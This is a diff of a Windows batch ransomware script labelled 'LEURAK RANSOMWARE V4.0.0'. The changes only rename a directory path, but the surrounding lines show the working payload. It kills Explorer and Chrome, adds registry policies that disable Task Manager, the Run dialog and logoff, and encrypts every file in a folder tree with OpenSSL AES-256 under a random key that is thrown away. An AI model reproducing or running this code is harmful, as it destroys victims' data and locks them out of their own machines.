@@ -2,12 +2,12 @@
 
 
 title LEURAK RANSOMWARE V4.0.0
-set openssl=%USERPROFILE%\leurak_ransomware_batch\openssl.exe
+set openssl=%USERPROFILE%\LEURAK_RANSOMWARE\openssl.exe
 set randmaskey=%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
 taskkill /f /IM explorer.exe
 taskkill /f /IM chrome.exe
 :: taskkill /f /IM firefox.exe 
-move %USERPROFILE%\leurak_ransomware_batch\leurak_wallpaper.bmp %USERPROFILE%\AppData\Local
+move %USERPROFILE%\LEURAK_RANSOMWARE\leurak_wallpaper.bmp %USERPROFILE%\AppData\Local
 reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
 reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v NoLogoff /t REG_DWORD /d 1 /f 
@@ -61,5 +61,5 @@ echo Good luck > COM1
 echo Good bye > COM1
 echo And FUCK! > COM1
 
-cd %USERPROFILE%\leurak_ransomware_batch 
+cd %USERPROFILE%\LEURAK_RANSOMWARE
 for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.leurak -k %randmaskey%
